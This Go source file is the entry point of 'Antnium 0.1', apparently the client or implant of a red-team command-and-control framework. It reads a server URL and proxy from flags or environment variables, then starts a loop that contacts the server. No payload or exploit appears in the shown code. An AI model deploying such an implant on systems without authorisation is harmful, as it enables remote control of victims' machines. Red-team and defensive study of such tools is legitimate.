package main

import (
	"flag"
	"fmt"
	"os"

	"github.com/dobin/antnium/pkg/client"
	"github.com/dobin/antnium/pkg/wingman"
	log "github.com/sirupsen/logrus"
)

func main() {
	flagServerUrl := flag.String("server", "", "ENV: SERVER")
	flagProxyUrl := flag.String("proxy", "", "ENV: PROXY")
	doWingman := flag.Bool("wingman", false, "")
	proto := flag.String("proto", "", "proto")
	data := flag.String("data", "", "data")
	flag.Parse()

	fmt.Println("Antnium 0.1")
	if *doWingman {
		wingman := wingman.MakeWingman()
		wingman.StartWingman(*proto, *data)
		return
	}

	lvl := "debug"
	ll, err := log.ParseLevel(lvl)
	if err != nil {
		ll = log.DebugLevel
	}
	// set global log level
	log.SetLevel(ll)

	c := client.NewClient()

	if os.Getenv("SERVER") != "" {
		c.Campaign.ServerUrl = os.Getenv("SERVER")
	}
	if os.Getenv("PROXY") != "" {
		c.Campaign.ProxyUrl = os.Getenv("PROXY")
	}
	// env can be overwritten with args
	if *flagServerUrl != "" {
		c.Campaign.ServerUrl = *flagServerUrl
	}
	if *flagProxyUrl != "" {
		c.Campaign.ProxyUrl = *flagProxyUrl
	}

	c.Start()
	c.Loop()

}
